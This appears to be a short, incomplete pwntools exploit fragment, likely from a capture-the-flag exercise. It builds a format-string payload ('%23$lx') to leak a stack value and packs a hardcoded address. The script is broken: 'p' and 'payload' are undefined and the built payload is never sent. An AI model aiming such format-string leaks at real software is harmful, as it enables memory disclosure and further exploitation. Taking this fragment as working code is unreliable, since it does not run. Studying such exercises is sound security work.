from pwn import *
from pwn import p64
from pwn import process
import binascii

number = 18 + 5
name = f"%{number}$lx".encode()
addr = p64(0x5c945e8561c5)
print(b"addr: " + binascii.hexlify(addr))

p.sendline(payload)

